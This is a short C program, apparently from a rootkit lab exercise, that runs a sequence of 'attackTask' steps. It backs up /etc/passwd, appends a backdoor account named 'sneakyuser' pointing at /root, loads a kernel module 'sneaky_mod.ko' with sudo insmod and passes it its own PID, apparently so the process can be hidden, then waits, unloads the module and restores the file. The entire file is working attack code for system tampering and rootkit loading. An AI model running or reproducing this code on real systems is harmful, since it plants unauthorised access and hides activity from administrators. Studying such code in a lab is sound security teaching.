#include <stdlib.h>  
#include <stdio.h> 
#include <sys/types.h> 
#include <unistd.h> 

void attackTask_1(){//print pid
  printf("sneaky_process pid = %d\n",getpid());
}
void attackTask_2(){//insert and move
  system("cp  /etc/passwd  /tmp");                                                      
  system("echo \'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\' >> /etc/passwd");    
}
void attackTask_3(){//load mod
  char command[600];                                                                    
  sprintf(command,"sudo  insmod  sneaky_mod.ko  myPID=%d",(int)getpid());      
  system(command);
}
void attackTask_4(){//while loop                                       
  printf("Enter 'q' for quit; other for continue...\n");   
  char c = getchar();                                      
  while(c != 'q'){                                         
    c = getchar();                                           
  }                                                        
}
void attackTask_5(){//unload mod
  system("sudo    rmmod        sneaky_mod.ko");   
}
void attackTask_6(){//restore passwd                                      
  system("cp      /tmp/passwd  /etc");  
  system("rm      /tmp/passwd");
}
                                      
int main(void){
  attackTask_1();
  attackTask_2();
  attackTask_3();
  attackTask_4();
  attackTask_5();
  attackTask_6();
  return EXIT_SUCCESS;
}
